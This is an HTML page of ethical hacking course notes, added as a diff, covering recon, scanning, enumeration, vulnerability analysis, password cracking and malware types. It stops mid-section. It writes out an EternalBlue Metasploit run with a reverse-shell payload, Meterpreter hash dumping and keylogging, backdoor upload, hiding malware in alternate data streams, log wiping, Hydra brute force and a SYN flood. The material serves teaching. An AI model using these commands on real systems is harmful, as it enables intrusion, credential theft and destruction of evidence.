@@ -1,0 +1,1100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ethical Hacking</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap');
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Inter',sans-serif;background:#0f172a;color:#e2e8f0;line-height:1.8;font-size:15px}
+.hero{background:linear-gradient(135deg,#1a1a2e,#16213e 50%,#0f3460);color:#fff;padding:44px 24px;text-align:center;border-bottom:3px solid #e94560}
+.hero h1{font-size:24px;font-weight:800}.hero h1 span{color:#e94560}
+.hero .sub{font-size:13px;color:#94a3b8;margin-top:4px}
+.hero .meta{display:flex;justify-content:center;gap:14px;margin-top:12px;flex-wrap:wrap}
+.hero .meta span{font-size:11px;background:rgba(233,69,96,.15);border:1px solid rgba(233,69,96,.3);padding:4px 12px;border-radius:20px;color:#f87171}
+.ct{max-width:960px;margin:0 auto;padding:20px 20px 80px}
+.acts{display:flex;justify-content:flex-end;gap:8px;margin-bottom:14px}
+.acts button{font:600 12px Inter,sans-serif;padding:6px 14px;border-radius:6px;border:1px solid #334155;background:#1e293b;color:#e94560;cursor:pointer}
+.phase{margin:28px 0 10px;padding:12px 18px;border-radius:8px;font-size:13px;font-weight:800;text-transform:uppercase;letter-spacing:.8px}
+.phase-r{background:linear-gradient(90deg,#1c1917,#1e293b);color:#f87171;border-left:4px solid #e94560}
+.phase-p{background:linear-gradient(90deg,#1a1625,#1e293b);color:#c084fc;border-left:4px solid #a855f7}
+.s{margin-bottom:8px;border-radius:10px;border:1px solid #1e293b;background:#1e293b;overflow:hidden}
+.s-h{padding:14px 18px;cursor:pointer;display:flex;align-items:center;gap:12px;user-select:none}
+.s-h:hover{background:#273548}
+.s-h h2{font-size:14px;font-weight:700;flex:1;color:#f1f5f9}
+.sn{min-width:40px;height:30px;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:800;color:#fff;flex-shrink:0}
+.sn-r{background:#dc2626}.sn-p{background:#9333ea}
+.tag{font-size:10px;font-weight:600;padding:2px 8px;border-radius:10px;flex-shrink:0}
+.tag-t{background:rgba(239,68,68,.15);color:#f87171;border:1px solid rgba(239,68,68,.2)}.tag-l{background:rgba(34,197,94,.15);color:#4ade80;border:1px solid rgba(34,197,94,.2)}.tag-s{background:rgba(234,179,8,.15);color:#facc15;border:1px solid rgba(234,179,8,.2)}
+.cv{width:16px;height:16px;transition:transform .2s;color:#64748b}
+.s.o .cv{transform:rotate(180deg)}
+.s-b{display:none;padding:0 18px 22px;border-top:1px solid #334155}
+.s.o .s-b{display:block}
+h3{font-size:15px;font-weight:700;color:#f87171;margin:18px 0 10px;padding-bottom:5px;border-bottom:2px solid #334155}
+h4{font-size:13px;font-weight:700;color:#fb923c;margin:14px 0 5px;text-transform:uppercase;letter-spacing:.3px}
+p{margin-bottom:8px;color:#cbd5e1}
+ul,ol{padding-left:20px;margin:6px 0 10px;color:#94a3b8}li{margin-bottom:5px}
+strong{color:#f1f5f9}
+code{font-family:'JetBrains Mono',monospace;font-size:12.5px;background:#334155;color:#fbbf24;padding:2px 6px;border-radius:4px}
+pre{background:#030712;color:#a5f3fc;border:1px solid #1e293b;border-radius:8px;padding:14px 16px;margin:8px 0 12px;overflow-x:auto;font-family:'JetBrains Mono',monospace;font-size:12.5px;line-height:1.85;white-space:pre-wrap}
+.box{border-radius:8px;padding:12px 16px;margin:10px 0;font-size:14px}
+.box-b{background:rgba(59,130,246,.1);border-left:4px solid #3b82f6;color:#93c5fd}
+.box-g{background:rgba(34,197,94,.1);border-left:4px solid #22c55e;color:#86efac}
+.box-y{background:rgba(234,179,8,.1);border-left:4px solid #eab308;color:#fde68a}
+.box-r{background:rgba(239,68,68,.1);border-left:4px solid #ef4444;color:#fca5a5}
+.tbl{overflow-x:auto;margin:8px 0;border-radius:8px;border:1px solid #334155}
+table{width:100%;border-collapse:collapse;font-size:13px}
+th{background:#1e293b;text-align:left;padding:8px 12px;font-weight:600;font-size:11px;text-transform:uppercase;letter-spacing:.4px;color:#94a3b8;border-bottom:2px solid #334155}
+td{padding:7px 12px;border-bottom:1px solid #1e293b;color:#cbd5e1;vertical-align:top}tr:last-child td{border-bottom:none}
+.diagram{background:#030712;border:2px dashed #334155;border-radius:8px;padding:14px;margin:8px 0;font-family:'JetBrains Mono',monospace;font-size:12px;line-height:1.5;white-space:pre;overflow-x:auto;text-align:center;color:#94a3b8}
+@media(max-width:640px){.hero{padding:28px 14px}.hero h1{font-size:20px}pre{font-size:11px}.diagram{font-size:10px}}
+</style>
+</head>
+<body>
+
+<div class="hero">
+<h1>Ethical Hacking</h1>
+</div>
+
+<div class="ct">
+<div class="acts">
+<button onclick="document.querySelectorAll('.s').forEach(s=>s.classList.add('o'))">Expand All</button>
+<button onclick="document.querySelectorAll('.s').forEach(s=>s.classList.remove('o'))">Collapse All</button>
+</div>
+
+<div class="phase phase-r">🔴 Sessions 1–15 — Recon → Scanning → Exploitation → Post-Exploitation</div>
+
+<!-- ═══ SESSION 1 ═══ -->
+<div class="s"><div class="s-h" onclick="this.closest('.s').classList.toggle('o')"><span class="sn sn-r">S01</span><h2>Introduction to Ethical Hacking</h2><span class="tag tag-t">Theory</span><svg class="cv" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"/></svg></div><div class="s-b">
+
+<h3>Information Security Overview</h3>
+<p>Information Security (InfoSec) is the practice of protecting information from unauthorized access, use, disclosure, disruption, modification, or destruction. The goal is to maintain the <strong>CIA Triad</strong>:</p>
+<ul>
+<li><strong>Confidentiality:</strong> Only authorized people can access data. Achieved via encryption, access controls, authentication.</li>
+<li><strong>Integrity:</strong> Data is accurate and unaltered. Achieved via hashing, digital signatures, checksums.</li>
+<li><strong>Availability:</strong> Systems and data are accessible when needed. Achieved via redundancy, backups, DDoS protection.</li>
+</ul>
+<p>Extended model: <strong>CIA + AAA</strong> = Authentication (who are you?), Authorization (what can you do?), Accounting/Auditing (what did you do?).</p>
+<p>Additional properties: <strong>Non-repudiation</strong> (can't deny actions — digital signatures), <strong>Authenticity</strong> (data is genuine).</p>
+
+<h4>Information Security Threats &amp; Attack Vectors</h4>
+<div class="tbl"><table>
+<tr><th>Threat Category</th><th>Examples</th></tr>
+<tr><td><strong>Network Threats</strong></td><td>Sniffing, MITM, DoS/DDoS, Session Hijacking, DNS Poisoning</td></tr>
+<tr><td><strong>Host Threats</strong></td><td>Malware, Privilege escalation, Backdoors, Password attacks</td></tr>
+<tr><td><strong>Application Threats</strong></td><td>SQLi, XSS, CSRF, Buffer overflow, Insecure APIs</td></tr>
+<tr><td><strong>Physical Threats</strong></td><td>Theft, Tailgating, Dumpster diving, Shoulder surfing</td></tr>
+<tr><td><strong>Social Engineering</strong></td><td>Phishing, Pretexting, Baiting, Quid pro quo</td></tr>
+</table></div>
+
+<p><strong>Threat Actors:</strong> Script Kiddies (low skill, use existing tools), Hacktivists (political motive), Organized Crime (financial), Nation-State/APT (espionage, very advanced), Insiders (employees).</p>
+
+<h4>Hacking Concepts</h4>
+<p><strong>Hacking:</strong> Finding and exploiting weaknesses in systems. <strong>Types of hackers:</strong></p>
+<div class="tbl"><table>
+<tr><th>Type</th><th>Intent</th><th>Legal</th></tr>
+<tr><td><strong>White Hat</strong></td><td>Authorized testing, defense, ethical</td><td>Legal (with permission)</td></tr>
+<tr><td><strong>Black Hat</strong></td><td>Unauthorized access, malicious</td><td>Illegal</td></tr>
+<tr><td><strong>Grey Hat</strong></td><td>Tests without permission, discloses</td><td>Legally grey area</td></tr>
+</table></div>
+
+<h4>Hacking Phases (Cyber Kill Chain — attacker's perspective)</h4>
+<ol>
+<li><strong>Reconnaissance:</strong> Gather info about target (passive: OSINT; active: scanning)</li>
+<li><strong>Scanning:</strong> Identify live hosts, open ports, services, OS</li>
+<li><strong>Gaining Access:</strong> Exploit vulnerabilities to get in</li>
+<li><strong>Maintaining Access:</strong> Install backdoors, rootkits, persistence</li>
+<li><strong>Clearing Tracks:</strong> Delete logs, hide evidence</li>
+</ol>
+
+<h4>Ethical Hacking Concepts</h4>
+<p>An <strong>ethical hacker</strong> uses the same tools and techniques as attackers but with <strong>written authorization</strong> to find and fix vulnerabilities before real attackers exploit them. Requires: Scope definition, Rules of engagement, Written permission, NDA, Report findings.</p>
+
+<h4>Information Security Controls</h4>
+<ul>
+<li><strong>Administrative:</strong> Policies, procedures, training, background checks, incident response plans</li>
+<li><strong>Technical (Logical):</strong> Firewalls, IDS/IPS, encryption, access controls, MFA, SIEM</li>
+<li><strong>Physical:</strong> Locks, CCTV, biometrics, fences, guards, mantraps</li>
+</ul>
+<p><strong>Defense in Depth:</strong> Multiple layers of security so if one fails, others still protect.</p>
+
+<h4>Penetration Testing Types</h4>
+<div class="tbl"><table>
+<tr><th>Type</th><th>Knowledge</th><th>Simulates</th></tr>
+<tr><td><strong>Black-Box</strong></td><td>Zero knowledge of target</td><td>External attacker</td></tr>
+<tr><td><strong>White-Box</strong></td><td>Full knowledge (source code, architecture, credentials)</td><td>Insider or code audit</td></tr>
+<tr><td><strong>Grey-Box</strong></td><td>Partial knowledge (user-level access)</td><td>Privileged insider or compromised user</td></tr>
+</table></div>
+
+<h4>Key Laws &amp; Standards</h4>
+<ul>
+<li><strong>IT Act 2000 (India):</strong> Cybercrimes, digital signatures, e-governance. Section 43 (unauthorized access), Section 66 (hacking), Section 67 (obscene content)</li>
+<li><strong>DPDP Act 2023 (India):</strong> Digital Personal Data Protection</li>
+<li><strong>GDPR (EU):</strong> Data privacy, right to be forgotten, breach notification</li>
+<li><strong>HIPAA (US):</strong> Healthcare data protection</li>
+<li><strong>PCI DSS:</strong> Payment card data security standard</li>
+<li><strong>ISO 27001:</strong> Information Security Management System (ISMS)</li>
+<li><strong>NIST Cybersecurity Framework:</strong> Identify, Protect, Detect, Respond, Recover</li>
+</ul>
+
+</div></div>
+
+<!-- ═══ SESSION 2-3 ═══ -->
+<div class="s"><div class="s-h" onclick="this.closest('.s').classList.toggle('o')"><span class="sn sn-r">S02-03</span><h2>Footprinting &amp; Reconnaissance</h2><span class="tag tag-t">Theory</span><span class="tag tag-l">Lab</span><svg class="cv" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"/></svg></div><div class="s-b">
+
+<h3>Footprinting Concepts</h3>
+<p>The <strong>first phase</strong> of hacking. Collecting as much information as possible about the target before attacking. <strong>Passive:</strong> No direct contact with target (OSINT, Google, social media). <strong>Active:</strong> Direct contact (ping, traceroute, social engineering).</p>
+
+<h4>What Information to Gather</h4>
+<p>Organization info (structure, employees, emails, phone numbers), Network info (domains, subdomains, IPs, DNS records, network blocks), System info (OS, web server version, technologies used).</p>
+
+<h4>Google Dorking (Advanced Google Hacking)</h4>
+<pre># Find login pages
+site:target.com inurl:login OR inurl:admin OR inurl:portal
+
+# Find exposed files
+site:target.com filetype:pdf OR filetype:xls OR filetype:doc
+site:target.com filetype:sql OR filetype:bak OR filetype:log
+
+# Find directory listings
+site:target.com intitle:"index of" OR intitle:"parent directory"
+
+# Find configuration files
+site:target.com ext:xml OR ext:conf OR ext:env OR ext:ini
+
+# Find exposed passwords/credentials
+site:target.com intext:"password" filetype:log
+site:target.com "db_password" OR "DB_PASSWORD" filetype:env
+
+# Find vulnerable pages
+site:target.com inurl:".php?id=" (SQLi candidates)
+site:target.com inurl:"/wp-admin" (WordPress admin)
+
+# Find cameras, IoT devices
+inurl:"/view/index.shtml" (IP cameras)
+intitle:"webcamXP 5" (webcam software)</pre>
+
+<h4>Footprinting Tools &amp; Techniques</h4>
+<pre># ═══ WHOIS — Domain registration info ═══
+$ whois target.com
+# Reveals: Registrant name/org, email, phone, nameservers,
+# creation/expiry dates, registrar
+
+# ═══ DNS Footprinting ═══
+$ dig target.com ANY              # All DNS records
+$ dig target.com MX               # Mail servers
+$ dig target.com NS               # Nameservers
+$ dig target.com TXT              # SPF, DKIM, verification records
+$ host -t axfr target.com ns1.target.com   # Zone transfer attempt
+$ dnsrecon -d target.com          # Automated DNS recon
+$ fierce --domain target.com      # DNS brute-force subdomains
+
+# ═══ Subdomain Enumeration ═══
+$ sublist3r -d target.com
+$ amass enum -d target.com
+# Web tools: crt.sh (certificate transparency), SecurityTrails
+
+# ═══ Network Footprinting ═══
+$ traceroute target.com           # Path to target
+$ ping target.com                 # Check if alive
+$ nslookup target.com
+$ dig +short target.com
+
+# ═══ theHarvester — Email &amp; Subdomain Gathering ═══
+$ theHarvester -d target.com -b google,bing,linkedin -l 200
+# Collects: email addresses, subdomains, IPs, employee names
+
+# ═══ CeWL — Custom Wordlist from Website ═══
+$ cewl https://target.com -d 3 -m 5 -w wordlist.txt
+# -d 3 = spider depth 3, -m 5 = min word length 5
+
+# ═══ Website Mirroring ═══
+$ httrack https://target.com -O /tmp/target_mirror
+# Creates offline copy of entire website
+
+# ═══ Email Header Analysis ═══
+# View full email headers → Identify sender IP, mail server,
+# SPF/DKIM pass/fail, routing path, potential spoofing
+
+# ═══ Website Info ═══
+$ curl -I https://target.com      # HTTP headers (Server, X-Powered-By)
+$ whatweb target.com               # Technology fingerprinting
+$ robots.txt analysis:  https://target.com/robots.txt</pre>
+
+<h4>OSINT Tools Summary</h4>
+<div class="tbl"><table>
+<tr><th>Tool</th><th>Purpose</th></tr>
+<tr><td>Netcraft</td><td>Website technology, hosting history, SSL info</td></tr>
+<tr><td>Shodan</td><td>IoT search engine — find exposed devices, servers, cameras</td></tr>
+<tr><td>Censys</td><td>Internet-wide scan data, certificates</td></tr>
+<tr><td>Maltego</td><td>Visual link analysis, relationship mapping</td></tr>
+<tr><td>Recon-ng</td><td>Modular recon framework</td></tr>
+<tr><td>theHarvester</td><td>Emails, subdomains from search engines</td></tr>
+<tr><td>PeekYou</td><td>People search — find social profiles</td></tr>
+<tr><td>FOCA</td><td>Document metadata extraction</td></tr>
+</table></div>
+
+<h4>Footprinting Countermeasures</h4>
+<p>Use WHOIS privacy, restrict DNS zone transfers, configure robots.txt carefully, remove metadata from documents, train employees against social engineering, monitor for data leaks, use privacy settings on social media.</p>
+
+</div></div>
+
+<!-- ═══ SESSION 4 ═══ -->
+<div class="s"><div class="s-h" onclick="this.closest('.s').classList.toggle('o')"><span class="sn sn-r">S04</span><h2>Scanning Networks</h2><span class="tag tag-t">Theory</span><span class="tag tag-l">Lab</span><svg class="cv" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"/></svg></div><div class="s-b">
+
+<h3>Scanning Techniques</h3>
+<div class="tbl"><table>
+<tr><th>Scan Type</th><th>How It Works</th><th>Stealth?</th><th>Nmap Flag</th></tr>
+<tr><td><strong>TCP Connect</strong></td><td>Full 3-way handshake (SYN→SYN-ACK→ACK)</td><td>No (logged)</td><td><code>-sT</code></td></tr>
+<tr><td><strong>SYN (Half-open)</strong></td><td>SYN→SYN-ACK→RST (never completes)</td><td>Semi-stealth</td><td><code>-sS</code> (default)</td></tr>
+<tr><td><strong>FIN</strong></td><td>Sends FIN flag only. Open=no response, Closed=RST</td><td>Stealthy</td><td><code>-sF</code></td></tr>
+<tr><td><strong>XMAS</strong></td><td>Sets FIN+PSH+URG flags (lit up like Xmas tree)</td><td>Stealthy</td><td><code>-sX</code></td></tr>
+<tr><td><strong>NULL</strong></td><td>No flags set. Open=no response, Closed=RST</td><td>Stealthy</td><td><code>-sN</code></td></tr>
+<tr><td><strong>UDP</strong></td><td>Sends UDP packet. Open=no response, Closed=ICMP unreachable</td><td>Slow</td><td><code>-sU</code></td></tr>
+<tr><td><strong>ACK</strong></td><td>Sends ACK flag. Determines if port is filtered (firewall)</td><td>—</td><td><code>-sA</code></td></tr>
+<tr><td><strong>Idle/Zombie</strong></td><td>Uses a third-party "zombie" host's IP ID sequence</td><td>Very stealthy</td><td><code>-sI zombie</code></td></tr>
+</table></div>
+
+<h3>Nmap — Complete Reference</h3>
+<pre># ═══ Host Discovery ═══
+$ nmap -sn 192.168.1.0/24                 # Ping sweep (no port scan)
+$ nmap -sn -PE 192.168.1.0/24             # ICMP echo discovery
+$ nmap -sn -PS22,80,443 192.168.1.0/24    # TCP SYN discovery on specific ports
+$ nmap -sn -PA80 192.168.1.0/24           # TCP ACK discovery
+$ nmap -sn -PU53 192.168.1.0/24           # UDP discovery
+
+# ═══ Port Scanning ═══
+$ nmap -sS target.com                     # SYN scan (default, fast, semi-stealth)
+$ nmap -sT target.com                     # TCP connect (full handshake)
+$ nmap -sU target.com                     # UDP scan (slow)
+$ nmap -p 1-1000 target.com               # Specific ports
+$ nmap -p- target.com                     # All 65535 ports
+$ nmap --top-ports 100 target.com         # Top 100 common ports
+$ nmap -F target.com                      # Fast scan (top 100 ports)
+
+# ═══ Service &amp; Version Detection ═══
+$ nmap -sV target.com                     # Service/version detection
+$ nmap -sV --version-intensity 5 target   # More aggressive probing
+
+# ═══ OS Detection ═══
+$ nmap -O target.com                      # OS fingerprinting
+$ nmap -A target.com                      # Aggressive: OS + Version + Script + Traceroute
+
+# ═══ NSE Scripts (Nmap Scripting Engine) ═══
+$ nmap --script=default target.com        # Default safe scripts
+$ nmap --script=vuln target.com           # Vulnerability scanning
+$ nmap --script=smb-os-discovery target   # SMB OS info
+$ nmap --script=http-title target.com     # Web page titles
+$ nmap --script=banner target.com         # Service banners
+
+# ═══ Firewall/IDS Evasion ═══
+$ nmap -f target.com                      # Fragment packets (8 bytes)
+$ nmap -D RND:5 target.com               # Decoy scan (5 random IPs)
+$ nmap -S 192.168.1.100 target.com        # Spoof source IP
+$ nmap --source-port 53 target.com        # Use DNS source port
+$ nmap -T0 target.com                     # Paranoid timing (very slow)
+$ nmap --data-length 25 target.com        # Add random data to packets
+
+# ═══ Output ═══
+$ nmap -oN scan.txt target.com            # Normal output
+$ nmap -oX scan.xml target.com            # XML output
+$ nmap -oG scan.gnmap target.com          # Greppable output
+$ nmap -oA scan_all target.com            # All formats</pre>
+
+<h4>Hping3 — Custom Packet Crafting</h4>
+<pre>$ hping3 -S target.com -p 80 -c 3        # SYN to port 80
+$ hping3 -F target.com -p 80              # FIN scan
+$ hping3 -UPF target.com -p 80            # XMAS scan (URG+PSH+FIN)
+$ hping3 --flood -S target.com -p 80      # SYN flood (DoS — lab only!)
+$ hping3 -1 target.com                    # ICMP ping
+$ hping3 -2 target.com -p 53             # UDP packet to port 53</pre>
+
+<h4>Banner Grabbing</h4>
+<pre>$ nc -nv target.com 80                    # Netcat — grab HTTP banner
+GET / HTTP/1.1
+Host: target.com
+
+$ nc -nv target.com 22                    # SSH banner
+$ curl -I https://target.com              # HTTP headers</pre>
+
+</div></div>
+
+<!-- ═══ SESSION 5 ═══ -->
+<div class="s"><div class="s-h" onclick="this.closest('.s').classList.toggle('o')"><span class="sn sn-r">S05</span><h2>Enumeration</h2><span class="tag tag-t">Theory</span><span class="tag tag-l">Lab</span><svg class="cv" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"/></svg></div><div class="s-b">
+
+<h3>What is Enumeration?</h3>
+<p>Active process of extracting <strong>specific information</strong> from discovered services: usernames, shares, groups, network resources, SNMP data, DNS records, LDAP entries. This is where you go from "this port is open" to "these users exist and these shares are accessible."</p>
+
+<div class="tbl"><table>
+<tr><th>Type</th><th>Port</th><th>Extracts</th><th>Tools</th></tr>
+<tr><td><strong>NetBIOS</strong></td><td>137-139</td><td>Hostnames, shares, users, domain info</td><td>nbtstat, nbtscan, enum4linux</td></tr>
+<tr><td><strong>SNMP</strong></td><td>161/162</td><td>Network devices, configs, users, processes</td><td>snmpwalk, snmp-check, onesixtyone</td></tr>
+<tr><td><strong>LDAP</strong></td><td>389/636</td><td>AD users, groups, OUs, computer objects</td><td>ldapsearch, AD Explorer, JXplorer</td></tr>
+<tr><td><strong>SMTP</strong></td><td>25</td><td>Valid email addresses (VRFY/EXPN commands)</td><td>smtp-user-enum, nmap scripts</td></tr>
+<tr><td><strong>DNS</strong></td><td>53</td><td>Zone transfers, subdomains, records</td><td>dig, dnsrecon, dnsenum, fierce</td></tr>
+<tr><td><strong>NFS</strong></td><td>2049</td><td>Exported shares, file systems</td><td>showmount, rpcinfo</td></tr>
+<tr><td><strong>SMB</strong></td><td>445</td><td>Shares, users, OS info, sessions</td><td>smbclient, enum4linux, crackmapexec</td></tr>
+</table></div>
+
+<pre># NetBIOS
+$ nbtstat -A 192.168.1.10              # Windows
+$ nbtscan 192.168.1.0/24              # Scan subnet
+$ nmap --script nbstat 192.168.1.10
+
+# SNMP (default community string "public" is a goldmine)
+$ snmpwalk -v2c -c public 192.168.1.10
+$ snmp-check 192.168.1.10
+$ onesixtyone -c /usr/share/wordlists/community.txt 192.168.1.10
+
+# LDAP
+$ ldapsearch -x -H ldap://192.168.1.10 -b "dc=cdac,dc=local"
+$ nmap --script ldap-search 192.168.1.10
+
+# SMTP User Enumeration
+$ smtp-user-enum -M VRFY -U users.txt -t 192.168.1.10
+
+# SMB / enum4linux (combines multiple tools)
+$ enum4linux -a 192.168.1.10
+$ smbclient -L //192.168.1.10 -N         # List shares (null session)
+$ crackmapexec smb 192.168.1.10 -u '' -p '' --shares
+
+# NFS
+$ showmount -e 192.168.1.10              # List exported shares
+$ rpcinfo -p 192.168.1.10</pre>
+
+</div></div>
+
+<!-- ═══ SESSION 6 ═══ -->
+<div class="s"><div class="s-h" onclick="this.closest('.s').classList.toggle('o')"><span class="sn sn-r">S06</span><h2>Vulnerability Analysis</h2><span class="tag tag-t">Theory</span><span class="tag tag-l">Lab</span><svg class="cv" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"/></svg></div><div class="s-b">
+
+<h3>Vulnerability Ecosystem</h3>
+<div class="tbl"><table>
+<tr><th>System</th><th>What It Is</th><th>Example</th></tr>
+<tr><td><strong>CVE</strong></td><td>Common Vulnerabilities and Exposures — unique ID per vulnerability</td><td>CVE-2021-44228 (Log4Shell)</td></tr>
+<tr><td><strong>CWE</strong></td><td>Common Weakness Enumeration — categories of weaknesses</td><td>CWE-89 (SQL Injection)</td></tr>
+<tr><td><strong>NVD</strong></td><td>National Vulnerability Database — NIST's CVE database with scores</td><td>nvd.nist.gov</td></tr>
+<tr><td><strong>CVSS</strong></td><td>Common Vulnerability Scoring System — severity rating (0-10)</td><td>Log4Shell = CVSS 10.0</td></tr>
+</table></div>
+
+<h4>CVSS Score Breakdown</h4>
+<div class="tbl"><table>
+<tr><th>Score</th><th>Severity</th><th>Action</th></tr>
+<tr><td>0.0</td><td>None</td><td>—</td></tr>
+<tr><td>0.1–3.9</td><td>Low</td><td>Schedule fix</td></tr>
+<tr><td>4.0–6.9</td><td>Medium</td><td>Fix within 30 days</td></tr>
+<tr><td>7.0–8.9</td><td>High</td><td>Fix within 7 days</td></tr>
+<tr><td>9.0–10.0</td><td>Critical</td><td>Fix immediately</td></tr>
+</table></div>
+
+<h3>Vulnerability Scanning Tools</h3>
+<pre># ═══ Nessus ═══
+# Commercial (free for home: Nessus Essentials). Most widely used.
+# Web interface at https://localhost:8834
+# Scans → New Scan → Basic Network Scan → Enter targets → Launch
+# Reports: Severity, CVE, remediation steps, exploit availability
+
+# ═══ OpenVAS (GVM — Greenbone Vulnerability Management) ═══
+# Free/open-source alternative to Nessus
+$ sudo gvm-setup                          # Initial setup
+$ sudo gvm-start                          # Start services
+# Web interface at https://localhost:9392
+
+# ═══ Nikto — Web Server Scanner ═══
+$ nikto -h https://target.com
+# Checks: Outdated server versions, dangerous files, misconfigs,
+# default files, CGI issues, SSL problems
+
+# ═══ Nmap Vuln Scripts ═══
+$ nmap --script vuln target.com           # Check common vulns
+$ nmap --script http-vuln* target.com     # HTTP vulns specifically</pre>
+
+</div></div>
+
+<!-- ═══ SESSION 7-8 ═══ -->
+<div class="s"><div class="s-h" onclick="this.closest('.s').classList.toggle('o')"><span class="sn sn-r">S07-08</span><h2>System Hacking</h2><span class="tag tag-t">Theory</span><span class="tag tag-l">Lab</span><svg class="cv" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"/></svg></div><div class="s-b">
+
+<h3>System Hacking Methodology</h3>
+<div class="diagram">1. Crack Passwords → 2. Escalate Privileges → 3. Execute Applications
+→ 4. Hide Files → 5. Cover Tracks</div>
+
+<h4>Password Cracking</h4>
+<div class="tbl"><table>
+<tr><th>Attack</th><th>Method</th><th>Tools</th></tr>
+<tr><td><strong>Brute Force</strong></td><td>Try every possible combination</td><td>Hydra, Medusa, Hashcat</td></tr>
+<tr><td><strong>Dictionary</strong></td><td>Try words from a wordlist</td><td>John the Ripper, Hashcat</td></tr>
+<tr><td><strong>Rainbow Tables</strong></td><td>Pre-computed hashes for quick lookup</td><td>RainbowCrack, ophcrack</td></tr>
+<tr><td><strong>Pass the Hash</strong></td><td>Use the hash directly without cracking</td><td>Mimikatz, pth-winexe</td></tr>
+<tr><td><strong>Credential Stuffing</strong></td><td>Use leaked credentials on other sites</td><td>Custom scripts</td></tr>
+</table></div>
+
+<pre># ═══ Hydra — Online Brute Force ═══
+$ hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
+$ hydra -L users.txt -P pass.txt 192.168.1.10 ftp
+$ hydra -l admin -P rockyou.txt 192.168.1.10 http-post-form \
+  "/login:user=^USER^&pass=^PASS^:F=incorrect"
+
+# ═══ John the Ripper — Offline Cracking ═══
+$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+$ john --show hashes.txt                  # Show cracked passwords
+
+# ═══ Hashcat — GPU Cracking ═══
+$ hashcat -m 0 hashes.txt rockyou.txt     # MD5
+$ hashcat -m 1000 hashes.txt rockyou.txt  # NTLM
+$ hashcat -m 1800 hashes.txt rockyou.txt  # SHA-512 (Linux shadow)</pre>
+
+<h4>Metasploit Framework</h4>
+<pre># ═══ Hack a Windows Machine ═══
+$ msfconsole                              # Start Metasploit
+
+msf6> search eternalblue                  # Find exploit
+msf6> use exploit/windows/smb/ms17_010_eternalblue
+msf6> set RHOSTS 192.168.1.10
+msf6> set LHOST 192.168.1.5              # Attacker's IP
+msf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6> exploit
+
+# ═══ Meterpreter Post-Exploitation ═══
+meterpreter> sysinfo                      # System info
+meterpreter> getuid                       # Current user
+meterpreter> getsystem                    # Attempt privilege escalation
+meterpreter> hashdump                     # Dump password hashes
+meterpreter> shell                        # Drop to system shell
+meterpreter> screenshot                   # Capture screen
+meterpreter> keyscan_start                # Start keylogger
+meterpreter> upload /tmp/backdoor.exe C:\\temp\\
+meterpreter> download C:\\Users\\admin\\secret.txt /tmp/</pre>
+
+<h4>Privilege Escalation</h4>
+<p><strong>Vertical:</strong> User → Admin/Root. <strong>Horizontal:</strong> User A → User B (same level). Methods: Exploit kernel vulns, misconfigurations, unquoted service paths, DLL hijacking, SUID binaries (Linux), token impersonation.</p>
+
+<h4>Hiding Files &amp; Covering Tracks</h4>
+<pre># NTFS Alternate Data Streams (Windows) — hide data inside a file
+C:\> type malware.exe > innocent.txt:hidden.exe
+C:\> dir /r                               # See ADS streams
+
+# Steganography — hide data inside images
+$ openstego embed -mf secret.txt -cf image.png -sf output.png
+
+# Clear Windows logs
+C:\> wevtutil cl Security
+C:\> wevtutil cl System
+C:\> wevtutil cl Application
+# Or: meterpreter> clearev
+
+# Clear Linux logs
+$ echo "" > /var/log/auth.log
+$ history -c && history -w                # Clear bash history
+$ shred -zu /var/log/syslog</pre>
+
+</div></div>
+
+<!-- ═══ SESSION 9-10 ═══ -->
+<div class="s"><div class="s-h" onclick="this.closest('.s').classList.toggle('o')"><span class="sn sn-r">S09-10</span><h2>Malware Threats</h2><span class="tag tag-t">Theory</span><span class="tag tag-l">Lab</span><svg class="cv" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"/></svg></div><div class="s-b">
+
+<h3>Malware Types</h3>
+<div class="tbl"><table>
+<tr><th>Type</th><th>Behavior</th><th>Example</th></tr>
+<tr><td><strong>Virus</strong></td><td>Attaches to files, needs user to execute. Self-replicates.</td><td>ILOVEYOU, Melissa</td></tr>
+<tr><td><strong>Worm</strong></td><td>Self-replicates WITHOUT user action. Spreads over network.</td><td>WannaCry, Conficker, Stuxnet</td></tr>
+<tr><td><strong>Trojan</strong></td><td>Disguised as legitimate software. Creates backdoor.</td><td>njRAT, DarkComet</td></tr>
+<tr><td><strong>RAT</strong></td><td>Remote Access Trojan — gives attacker full remote control</td><td>njRAT, Quasar, AsyncRAT</td></tr>
+<tr><td><strong>Ransomware</strong></td><td>Encrypts files, demands ransom for decryption key</td><td>WannaCry, LockBit, REvil</td></tr>
+<tr><td><strong>Rootkit</strong></td><td>Hides in OS kernel, conceals other malware</td><td>Kernel rootkits, bootkits</td></tr>
+<tr><td><strong>Spyware</strong></td><td>Silently collects user data (keystrokes, screens)</td><td>Pegasus, FinFisher</td></tr>
+<tr><td><strong>Adware</strong></td><td>Shows unwanted advertisements</td><td>Browser toolbar malware</td></tr>
+<tr><td><strong>Fileless</strong></td><td>Lives in memory only, uses legitimate tools (PowerShell)</td><td>PowerShell Empire attacks</td></tr>
+<tr><td><strong>Logic Bomb</strong></td><td>Triggers on condition (date, event)</td><td>Disgruntled employee plants code</td></tr>
+</table></div>
+
+<h4>Malware Analysis</h4>
+<ul>
